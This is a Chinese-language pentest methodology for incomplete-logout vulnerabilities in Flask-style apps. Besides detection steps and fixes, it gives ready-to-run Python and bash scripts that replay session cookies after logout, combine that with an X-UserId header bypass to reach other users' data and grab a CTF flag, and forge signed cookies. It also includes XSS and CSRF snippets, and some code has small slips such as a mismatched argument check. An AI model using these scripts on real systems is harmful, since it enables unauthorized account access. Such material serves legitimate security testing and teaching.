# 不完整登出攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套针对不完整登出（Incomplete Logout）漏洞的检测与利用流程，帮助发现和利用登出后会话未完全清除的安全缺陷。

## 1.2 适用范围

本文档适用于所有使用会话管理的 Web 应用，特别是：
- 使用 `session.pop()` 而非 `session.clear()` 的应用
- 登出时仅清除部分会话数据的应用
- 使用客户端会话（如 Flask 签名 Cookie）的应用
- 多会话并发的应用系统

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

不完整登出是指应用程序在用户登出时，未能完全清除所有会话相关数据，导致攻击者可以利用残留的会话信息重新获得访问权限。

**本质问题**：
- 登出时仅清除部分会话键（如仅清除 `user_id`）
- 未清除客户端会话 Cookie
- 服务端会话存储未同步清除
- 其他会话相关数据（权限、角色）未清除

### 典型漏洞代码

```python
# ❌ 危险代码：仅清除 user_id
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)  # 仅清除 user_id
    return redirect(url_for('login'))

# ✅ 安全代码：清除所有会话数据
@app.route('/logout', methods=['POST'])
def logout():
    session.clear()  # 清除所有会话数据
    return redirect(url_for('login'))
```

### Flask 会话特殊性

Flask 使用客户端签名 Cookie 存储会话数据，这意味着：
- 所有会话数据存储在客户端 Cookie 中
- 登出时需要完全清除 Cookie
- 仅清除部分键可能导致其他数据残留

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-613 | 会话过期不足 |
| CWE-384 | 会话固定 |
| CWE-639 | 访问控制参数化不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 用户登出 | `/logout` 端点 | 仅清除 user_id，保留其他数据 |
| 会话管理 | 多角色系统 | 登出后角色权限未清除 |
| 多设备登录 | 并发会话 | 一个设备登出不影响其他设备 |
| 单点登录 | SSO 登出 | 主应用登出但子应用未登出 |
| API 认证 | Token 系统 | 登出后 Token 未失效 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**登出后会话残留检测**：

```bash
# 步骤 1：登录并捕获完整会话
curl -c cookies.txt -X POST http://target.com/ \
  -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST http://target.com/password/test \
  -d "password=test" -L

echo "=== Before Logout ==="
cat cookies.txt | grep session

# 步骤 2：执行登出
curl -b cookies.txt -c cookies_after_logout.txt \
  -X POST http://target.com/logout -L

echo "=== After Logout ==="
cat cookies_after_logout.txt | grep session

# 步骤 3：比较会话 Cookie
# 如果 Cookie 仍然存在或仅部分清除，可能存在漏洞
```

**登出后访问受保护资源**：

```bash
# 步骤 1：登录
curl -c cookies.txt -X POST http://target.com/ \
  -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST http://target.com/password/test \
  -d "password=test" -L

# 步骤 2：验证登录状态
curl -b cookies.txt http://target.com/dashboard
echo "Before logout: $?"

# 步骤 3：登出
curl -b cookies.txt -X POST http://target.com/logout -L

# 步骤 4：使用原 Cookie 访问
curl -b cookies.txt http://target.com/dashboard
echo "After logout: $?"

# 如果仍能访问（返回 200），登出未完全失效会话
```

### 2.3.2 会话数据残留检测

```python
#!/usr/bin/env python3
"""
检测登出后会话数据残留
"""

import requests
from itsdangerous import URLSafeTimedSerializer
import base64
import json

BASE_URL = 'http://target.com'

def decode_flask_session(cookie_value):
    """解码 Flask 会话 Cookie（无需密钥）"""
    try:
        parts = cookie_value.split('.')
        if len(parts) < 2:
            return None

        # 解码 payload
        payload = parts[0]
        # 添加 padding
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding

        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception as e:
        return None

def test_logout_invalidation():
    """测试登出后会话清除情况"""
    session = requests.Session()

    # 登录
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)

    # 获取登录后会话
    login_cookie = session.cookies.get('session')
    print(f"=== Login Session ===")
    print(f"Cookie: {login_cookie}")

    login_data = decode_flask_session(login_cookie)
    if login_data:
        print(f"Decoded: {login_data}")

    # 登出
    session.post(f'{BASE_URL}/logout')

    # 获取登出后会话
    logout_cookie = session.cookies.get('session')
    print(f"\n=== After Logout ===")
    print(f"Cookie: {logout_cookie}")

    if logout_cookie:
        logout_data = decode_flask_session(logout_cookie)
        if logout_data:
            print(f"Decoded: {logout_data}")

            # 检查残留数据
            if logout_data:
                print("\n[VULNERABLE] Session data still present after logout:")
                for key, value in logout_data.items():
                    print(f"  {key}: {value}")
                return True

    print("[SAFE] Session cleared after logout")
    return False

if __name__ == '__main__':
    test_logout_invalidation()
```

### 2.3.3 白盒测试

**代码审计要点**：

```python
# 搜索登出相关代码
grep -rn "logout" --include="*.py" .
grep -rn "session.pop" --include="*.py" .
grep -rn "session.clear" --include="*.py" .

# 检查登出实现
# ❌ 危险模式
session.pop('user_id', None)
session.pop('username', None)
del session['authenticated']

# ✅ 安全模式
session.clear()
```

**会话键分析**：

```python
# 识别应用中所有会话键
# 常见会话键：
# - user_id
# - username
# - authenticated
# - role
# - permissions
# - csrf_token
# - _fresh

# 检查登出时是否清除所有键
```

### 2.3.4 自动化检测脚本

```python
#!/usr/bin/env python3
"""
不完整登出漏洞自动化检测
"""

import requests
import sys

class IncompleteLogoutDetector:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()

    def login(self):
        """执行登录"""
        # 两阶段登录（根据目标应用调整）
        self.session.post(f'{self.base_url}/',
                         data={'username': self.username},
                         allow_redirects=False)
        response = self.session.post(
            f'{self.base_url}/password/{self.username}',
            data={'password': self.password},
            allow_redirects=False
        )
        return 'dashboard' in response.headers.get('Location', '')

    def check_dashboard_access(self):
        """检查是否能访问仪表板"""
        response = self.session.get(f'{self.base_url}/dashboard')
        return response.status_code == 200

    def logout(self):
        """执行登出"""
        self.session.post(f'{self.base_url}/logout')

    def detect(self):
        """检测不完整登出漏洞"""
        print(f"[*] Testing incomplete logout for {self.username}...")

        # 登录
        if not self.login():
            print("[-] Login failed")
            return False

        # 验证登录状态
        if not self.check_dashboard_access():
            print("[-] Cannot access dashboard after login")
            return False

        print("[+] Login successful")

        # 登出
        self.logout()
        print("[*] Logged out")

        # 尝试使用原会话访问
        if self.check_dashboard_access():
            print("[VULNERABLE] Dashboard accessible after logout!")
            return True
        else:
            print("[SAFE] Session properly invalidated")
            return False

def main():
    if len(sys.argv) < 5:
        print("Usage: python incomplete_logout.py <base_url> <username> <password>")
        sys.exit(1)

    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]

    detector = IncompleteLogoutDetector(base_url, username, password)

    if detector.detect():
        print("\n[!] Incomplete logout vulnerability detected!")
    else:
        print("\n[+] No incomplete logout vulnerability found")

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 登出后会话重放

```python
#!/usr/bin/env python3
"""
利用不完整登出漏洞进行会话重放
"""

import requests

BASE_URL = 'http://target.com'

def exploit_incomplete_logout():
    """利用不完整登出漏洞"""

    # 步骤 1：登录
    session = requests.Session()
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)

    # 保存原始 Cookie
    original_cookie = session.cookies.get('session')
    print(f"[+] Original session cookie: {original_cookie}")

    # 步骤 2：登出
    session.post(f'{BASE_URL}/logout')
    print("[*] Logged out")

    # 步骤 3：使用原始 Cookie 创建新会话
    new_session = requests.Session()
    new_session.cookies.set('session', original_cookie)

    # 步骤 4：访问受保护资源
    print("[*] Attempting to access dashboard with old session...")
    response = new_session.get(f'{BASE_URL}/dashboard')

    if response.status_code == 200:
        print("[SUCCESS] Incomplete logout exploited!")

        # 提取敏感信息
        if 'FLAG' in response.text:
            import re
            flag = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag:
                print(f"[!] FLAG: {flag.group()}")

        return True
    else:
        print("[-] Exploit failed")
        return False

if __name__ == '__main__':
    exploit_incomplete_logout()
```

### 2.4.2 多会话并发利用

```python
#!/usr/bin/env python3
"""
利用不完整登出进行多会话攻击
"""

import requests
import concurrent.futures

BASE_URL = 'http://target.com'

def create_session(username, password):
    """创建会话"""
    session = requests.Session()
    session.post(f'{BASE_URL}/', data={'username': username}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/{username}', data={'password': password}, allow_redirects=False)
    return session

def test_session(session, session_id):
    """测试会话是否有效"""
    response = session.get(f'{BASE_URL}/dashboard')
    if response.status_code == 200:
        print(f"[+] Session {session_id}: Valid")
        return True
    else:
        print(f"[-] Session {session_id}: Invalid")
        return False

def multi_session_attack():
    """多会话并发攻击"""

    # 创建多个会话
    sessions = []
    for i in range(5):
        session = create_session('test', 'test')
        sessions.append(session)
        print(f"[+] Created session {i}")

    # 登出所有会话
    for i, session in enumerate(sessions):
        session.post(f'{BASE_URL}/logout')
        print(f"[*] Logged out session {i}")

    # 测试会话是否仍然有效
    print("\n[*] Testing sessions after logout...")
    valid_sessions = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_session, s, i): i for i, s in enumerate(sessions)}
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                valid_sessions += 1

    print(f"\n[!] {valid_sessions}/{len(sessions)} sessions still valid after logout")
    return valid_sessions > 0

if __name__ == '__main__':
    multi_session_attack()
```

### 2.4.3 结合其他漏洞利用

```python
#!/usr/bin/env python3
"""
结合不完整登出和 X-UserId 绕过
"""

import requests

BASE_URL = 'http://target.com'

def combined_attack():
    """组合攻击：不完整登出 + X-UserId 绕过"""

    # 步骤 1：登录
    session = requests.Session()
    session.post(f'{BASE_URL}/', data={'username': 'test'}, allow_redirects=False)
    session.post(f'{BASE_URL}/password/test', data={'password': 'test'}, allow_redirects=False)

    # 保存 Cookie
    original_cookie = session.cookies.get('session')

    # 步骤 2：登出
    session.post(f'{BASE_URL}/logout')

    # 步骤 3：使用原 Cookie + X-UserId 头部访问其他用户
    new_session = requests.Session()
    new_session.cookies.set('session', original_cookie)

    # 获取目标用户 ID（从密码页面）
    response = requests.get(f'{BASE_URL}/password/flag')
    import re
    user_id_match = re.search(r'name="user_id" value="(\d+)"', response.text)
    if user_id_match:
        target_user_id = user_id_match.group(1)
        print(f"[+] Target user ID: {target_user_id}")

        # 使用 X-UserId 头部访问
        response = new_session.get(
            f'{BASE_URL}/dashboard',
            headers={'X-UserId': target_user_id}
        )

        if response.status_code == 200 and 'FLAG' in response.text:
            flag = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag:
                print(f"[!] FLAG: {flag.group()}")
                return flag.group()

    return None

if __name__ == '__main__':
    combined_attack()
```

### 2.4.4 CTF Flag 获取完整流程

```bash
#!/bin/bash
# 不完整登出漏洞获取 Flag 完整流程

TARGET="http://localhost:40477"

echo "[*] Step 1: Login as test user"
curl -c cookies.txt -X POST "$TARGET/" -d "username=test" -L
curl -b cookies.txt -c cookies.txt -X POST "$TARGET/password/test" -d "password=test" -L

echo "[*] Step 2: Verify login status"
curl -b cookies.txt "$TARGET/dashboard" | grep -o "Welcome"

echo "[*] Step 3: Logout"
curl -b cookies.txt -X POST "$TARGET/logout" -L

echo "[*] Step 4: Test session after logout"
curl -b cookies.txt "$TARGET/dashboard" | grep -o "Welcome"

# 如果仍有输出，说明登出未完全失效

echo "[*] Step 5: Get flag user ID"
FLAG_USER_ID=$(curl -s "$TARGET/password/flag" | grep -oP 'name="user_id" value="\K\d+')
echo "[+] Flag user ID: $FLAG_USER_ID"

echo "[*] Step 6: Access flag dashboard with X-UserId"
curl -b cookies.txt "$TARGET/dashboard" -H "X-UserId: $FLAG_USER_ID" | grep -oP 'FLAG\{[^}]+\}'
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 Cookie 过期检查

```python
# 如果 Cookie 有过期时间，尝试以下方法

from itsdangerous import URLSafeTimedSerializer

# 1. 如果密钥已知，伪造新 Cookie
secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(secret_key, salt='cookie-session')
fresh_cookie = serializer.dumps({'user_id': 10032})

# 2. 修改时间戳（需要知道签名算法）
# 某些应用可能不严格验证时间戳
```

### 2.5.2 绕过服务端会话检查

```python
# 如果应用有服务端会话存储

# 1. 检查是否仅检查客户端 Cookie
# 某些应用可能仅验证 Cookie 签名，不检查服务端状态

# 2. 尝试重放旧 Cookie
# 如果服务端未同步清除，可能仍然有效
```

### 2.5.3 隐蔽攻击

```python
# 使用隐蔽方式利用漏洞

# 1. 通过 XSS 执行请求
# <script>
# fetch('/dashboard', {credentials: 'include'})
#   .then(r => r.text())
#   .then(data => console.log(data));
# </script>

# 2. 通过 CSRF 表单
# <form action="http://target.com/logout" method="POST">
#   <input type="submit" value="Click me">
# </form>
```

---

# 第三部分：附录

## 3.1 不完整登出检测检查清单

```
□ 登出后 Cookie 是否完全清除
□ 登出后会话数据是否残留
□ 登出后能否访问受保护资源
□ 多会话并发时是否全部失效
□ 服务端会话是否同步清除
□ CSRF Token 是否失效
□ 其他认证相关数据是否清除
```

## 3.2 常见登出实现缺陷

```python
# ❌ 危险实现

# 仅清除 user_id
session.pop('user_id', None)

# 仅清除部分键
session.pop('user_id', None)
session.pop('username', None)

# 仅设置过期时间（客户端 Cookie 仍存在）
response.set_cookie('session', '', expires=0)

# ✅ 安全实现

# 清除所有会话数据
session.clear()

# 服务端会话销毁
session.destroy()

# 客户端 Cookie 清除 + 服务端会话销毁
session.clear()
response.set_cookie('session', '', expires=0)
```

## 3.3 完整攻击脚本

```python
#!/usr/bin/env python3
"""
不完整登出漏洞完整攻击脚本
"""

import requests
import re
import sys

class IncompleteLogoutAttack:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def login(self, username, password):
        """登录"""
        self.session.post(f'{self.base_url}/',
                         data={'username': username},
                         allow_redirects=False)
        response = self.session.post(
            f'{self.base_url}/password/{username}',
            data={'password': password},
            allow_redirects=False
        )
        return 'dashboard' in response.headers.get('Location', '')

    def get_user_id(self, username):
        """获取用户 ID"""
        response = self.session.get(f'{self.base_url}/password/{username}')
        match = re.search(r'name="user_id" value="(\d+)"', response.text)
        return match.group(1) if match else None

    def logout(self):
        """登出"""
        self.session.post(f'{self.base_url}/logout')

    def access_dashboard(self, user_id=None):
        """访问仪表板"""
        headers = {}
        if user_id:
            headers['X-UserId'] = user_id

        response = self.session.get(
            f'{self.base_url}/dashboard',
            headers=headers
        )
        return response

    def extract_flag(self, html):
        """提取 Flag"""
        match = re.search(r'FLAG\{[^}]+\}', html)
        return match.group(0) if match else None

    def run_attack(self, attack_user, attack_pass, target_user):
        """执行完整攻击"""
        print(f"[*] Logging in as {attack_user}...")
        if not self.login(attack_user, attack_pass):
            print("[-] Login failed")
            return None

        print("[+] Login successful")

        # 获取目标用户 ID
        target_id = self.get_user_id(target_user)
        if not target_id:
            print(f"[-] Target user {target_user} not found")
            return None

        print(f"[+] Target user ID: {target_id}")

        # 登出
        print("[*] Logging out...")
        self.logout()

        # 使用原会话 + X-UserId 访问
        print("[*] Attempting to access target data after logout...")
        response = self.access_dashboard(target_id)

        if response.status_code == 200:
            print("[SUCCESS] Accessed target data after logout!")

            flag = self.extract_flag(response.text)
            if flag:
                print(f"[!] FLAG: {flag}")
                return flag
        else:
            print("[-] Access failed after logout")

        return None

def main():
    if len(sys.argv) < 5:
        print("Usage: python incomplete_logout_attack.py <base_url> <attack_user> <attack_pass> <target_user>")
        sys.exit(1)

    base_url = sys.argv[1]
    attack_user = sys.argv[2]
    attack_pass = sys.argv[3]
    target_user = sys.argv[4]

    attacker = IncompleteLogoutAttack(base_url)
    result = attacker.run_attack(attack_user, attack_pass, target_user)

    if result:
        print(f"\n[+] Attack successful! Flag: {result}")
    else:
        print("\n[-] Attack failed")

if __name__ == '__main__':
    main()
```

## 3.4 修复建议

1. **使用 session.clear()** - 登出时清除所有会话数据
2. **服务端会话销毁** - 如果有服务端会话存储，同步销毁
3. **Cookie 清除** - 设置 Cookie 过期时间为过去
4. **CSRF Token 失效** - 使 CSRF Token 失效
5. **多会话清除** - 清除用户所有并发会话
6. **审计代码** - 检查所有登出端点实现

---

**文档版本**：1.0
**最后更新**：2026-03-08
**参考来源**：XBEN-003-24 渗透测试实战
